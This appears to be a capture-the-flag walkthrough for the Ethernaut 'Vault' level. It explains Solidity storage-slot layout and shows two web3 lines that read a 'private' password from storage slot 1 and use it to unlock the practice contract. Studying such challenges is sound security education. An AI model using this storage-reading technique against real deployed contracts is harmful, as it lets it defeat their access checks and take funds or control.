# Vault

> Everything you use in a smart contract is publicly visible, even local variables and state variables marked "private".

#### How variables store in the storage layout

-   each slot store up to 32 bytes
-   stores only variables, not constant
-   variables store in slot from right to left
-   if the size of the variable does not fit for the remaining size of the slot, it will goes in the next new slot

#### Attack

There are two variables in the contract

```
  bool public locked;
  bytes32 private password;
```

-   bool locked is declared first and it takes 1 byte of slot index 0
-   bytes32 password is 32 bytes so it need a full slot so it goes in the next slot at index 1

-   get storage slot 1

```javascript
const slot1 = await web3.eth.getStorageAt(contract.address, 1)
```

-   unlock the vault

```javascript
await contract.unlock(slot1)
```

---

-   https://docs.soliditylang.org/en/v0.8.17/security-considerations.html
-   https://kubertu.com/blog/solidity-storage-in-depth/
-   https://medium.com/coinmonks/how-to-read-private-variables-in-contract-storage-with-truffle-ethernaut-lvl-8-walkthrough-b2382741da9f
